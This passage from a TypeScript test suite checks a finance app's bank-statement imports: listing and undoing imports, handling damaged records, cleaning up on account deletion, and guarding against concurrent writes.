      await importFile(SAVINGS.account_id, file, {}, {}, `${marker}.ofx`);
      delete process.env.MAX_TXN_BLOB_CHARS;
      await fake.hset(ctxKey('manual-transactions'), { [VISA.account_id]: 'not-ciphertext-but-long-enough-to-be-tried' });
      await importFile(VISA.account_id, file, {}, {}, `${marker}.ofx`);
    });
    // The refusals were logged, as they should be, and said nothing of the file.
    expect(logged).toContain('refusing to save');
    expect(logged).toContain('Stored manual transactions unreadable');
    expect(logged).not.toContain(marker);
    expect(logged).not.toContain('L1');
  });
});

describe('the list of imports, and undo', () => {
  test('the list says what is left of each import; undo takes every row out, edited or moved, with its exclusions and its record', async () => {
    const { body } = await importFile(CHECKING.account_id, fixture('checking-ofx102.ofx'), {}, {}, 'sept.ofx');
    const id = body.import_id as string;
    const typed = newManualTxn(CHECKING.account_id, { date: '2026-09-20', amount: 3, currency: 'USD', name: 'Typed by hand', category: null, note: null });
    await addManualTxn(ctx, typed);
    const rows = await book();
    const imported = rows.filter((r) => r.import_id === id);
    await editManualTxn(ctx, imported[0].id, { category: 'income' });
    await editManualTxn(ctx, imported[1].id, { account_id: SAVINGS.account_id }, { from: CHECKING.account_id });
    await setExcluded(ctx, imported[2].id, true);
    await setExcluded(ctx, typed.id, true);

    const listed = await list(CHECKING.account_id);
    expect(listed.status).toBe(200);
    expect(listed.body.imports).toEqual([
      expect.objectContaining({ id, record: 'ok', format: 'ofx', file_name: 'sept.ofx', counts: { imported: 8, present: 0, repeated: 1, unreadable: 0 }, rows_now: 8, edited_now: 2, moved_now: 1, statement: 'Checking ending 4567' }),
    ]);
    expect(listed.body.limits).toEqual({ max_bytes: MAX_FILE_BYTES, max_rows: 10_000 });

    expect((await undo({ account_id: CHECKING.account_id, import_id: id })).status).toBe(400); // not confirmed
    const done = await undo({ account_id: CHECKING.account_id, import_id: id, confirm: true });
    expect(done.status).toBe(200);
    expect(done.body).toEqual({ removed: 8, edited: 2, moved: 1 });
    expect(await book()).toEqual([typed]);
    expect(await book(SAVINGS.account_id)).toEqual([]);
    expect(await txnAnnotationStore.has(ctx, imported[2].id)).toBe(false);
    expect(await txnAnnotationStore.has(ctx, typed.id)).toBe(true);
    expect(await importStore.has(ctx, id)).toBe(false);
    expect((await list(CHECKING.account_id)).body.imports).toEqual([]);
    // Undone already: nothing to take out.
    expect((await undo({ account_id: CHECKING.account_id, import_id: id, confirm: true })).status).toBe(404);
  });

  test('an import is only undone on its own account', async () => {
    const { body } = await importFile(CHECKING.account_id, fixture('checking-ofx102.ofx'));
    expect((await undo({ account_id: SAVINGS.account_id, import_id: body.import_id, confirm: true })).status).toBe(404);
    expect(await book()).toHaveLength(8);
  });

  test('an import whose record is damaged is still listed and undone; one a later release wrote is listed and left alone', async () => {
    const { body } = await importFile(CHECKING.account_id, fixture('checking-ofx102.ofx'));
    const id = body.import_id as string;
    await fake.hset(ctxKey('imports'), { [id]: 'not-ciphertext-but-long-enough-to-be-tried' });
    expect((await list(CHECKING.account_id)).body.imports).toEqual([expect.objectContaining({ id, record: 'unreadable', rows_now: 8, file_name: null })]);
    expect((await undo({ account_id: CHECKING.account_id, import_id: id, confirm: true })).body).toMatchObject({ removed: 8 });
    expect(await importStore.has(ctx, id)).toBe(false);

    const second = (await importFile(CHECKING.account_id, fixture('checking-ofx102.ofx'))).body.import_id as string;
    await fake.hset(ctxKey('imports'), { [second]: await encrypt(JSON.stringify({ version: 2, from: 'a later release' })) });
    expect((await list(CHECKING.account_id)).body.imports).toEqual([expect.objectContaining({ id: second, record: 'unrecognised' })]);
    const { result } = await quietly(() => undo({ account_id: CHECKING.account_id, import_id: second, confirm: true }));
    expect(result.status).toBe(409);
    expect(result.body).toMatchObject({ unreadable: true, unrecognised_ids: [second] });
    expect(await book()).toHaveLength(8);
  });

  test('deleting the account deletes its imports’ records and settings, and leaves other accounts’ alone', async () => {
    const mine = (await importFile(CHECKING.account_id, fixture('checking-ofx102.ofx'))).body.import_id;
    const theirs = (await importFile(VISA.account_id, fixture('card-debit-credit.csv'), CARD_MAPPING, {}, 'card.csv')).body.import_id;
    const res = await manualAccounts.DELETE(new Request('http://localhost/api/manual-accounts', { method: 'DELETE', body: JSON.stringify({ account_id: CHECKING.account_id }) }));
    expect(res.status).toBe(200);
    expect(await importStore.has(ctx, mine)).toBe(false);
    expect(await importSettingsStore.has(ctx, CHECKING.account_id)).toBe(false);
    expect(await importStore.has(ctx, theirs)).toBe(true);
    expect(await importSettingsStore.has(ctx, VISA.account_id)).toBe(true);
  });
});

describe('racing other writers', () => {
  test('a row added between the preview and the import is matched against, never duplicated', async () => {
    const p = await preview(CHECKING.account_id, fixture('checking-ofx102.ofx'));
    expect(p.body.preview.counts.new).toBe(8);
    await addManualTxn(ctx, newManualTxn(CHECKING.account_id, { date: '2026-09-15', amount: 500, currency: 'USD', name: 'Online transfer to sav 9876', category: 'transfer out', note: null }));
    expect((await importFile(CHECKING.account_id, fixture('checking-ofx102.ofx'))).body).toMatchObject({ imported: 7, present: 1 });
    expect(await book()).toHaveLength(8);
  });

  test('a row added while the import is being written: the compare-and-set reads again, both land, and the record says what happened', async () => {
    const typed = newManualTxn(CHECKING.account_id, { date: '2026-09-30', amount: -0.42, currency: 'USD', name: 'INTEREST PAID', category: null, note: null });
    atNextScript('repo-update-entries', () => addManualTxn(ctx, typed));
    const { body } = await importFile(CHECKING.account_id, fixture('checking-ofx102.ofx'));
    expect(body).toMatchObject({ imported: 7, present: 1 });
    const rows = await book();
    expect(rows).toHaveLength(8);
    expect(rows[0]).toEqual(typed);
    const entry = (await importStore.get(ctx, body.import_id))!;
    expect(entry.counts).toEqual({ imported: 7, present: 1, repeated: 1, unreadable: 0 });
    expect(entry.records[8]).toMatchObject({ outcome: 'present', row_id: typed.id });
  });
});

describe('imported rows are ordinary manual rows everywhere', () => {
  test('in Activity, labelled, excludable, and kept to one currency in totals', async () => {
    const text = ['Date,Description,Amount,Currency', `${day(-3)},Corner shop,-12.50,USD`, `${day(-2)},Museum,-20.00,EUR`, `${day(-1)},Refund,5.00,USD`].join('\n');
    const options = { csv: { columns: { date: 0, description: 1, amount: 2, currency: 3 }, sign: 'negative-out' } };
    expect((await importFile(CHECKING.account_id, text, options, {}, 'trip.csv')).body.imported).toBe(3);
    const shop = (await book()).find((r) => r.name === 'Corner shop')!;
    const patched = await annotations.PATCH(new Request('http://localhost/api/transaction-annotations', { method: 'PATCH', body: JSON.stringify({ transaction_id: shop.id, excluded: true }) }));
    expect(patched.status).toBe(200);
    const res = await transactions.GET(new Request('http://localhost/api/transactions'));
    const shown = (await res.json()).transactions as any[];
    expect(shown.map((t) => [t.name, t.amount, t.iso_currency_code, t.source, t.account_name])).toEqual([
      ['Refund', -5, 'USD', 'import:csv', 'Checking'],
      ['Museum', 20, 'EUR', 'import:csv', 'Checking'],
      ['Corner shop', 12.5, 'USD', 'import:csv', 'Checking'],
    ]);
    expect(shown.find((t) => t.name === 'Corner shop').excluded).toBe(true);
    const currency = totalsCurrency(shown);
    expect(currency).toBe('USD');
    expect(shown.filter((t) => countsInTotals(t, currency)).map((t) => t.name)).toEqual(['Refund']);
  });
});
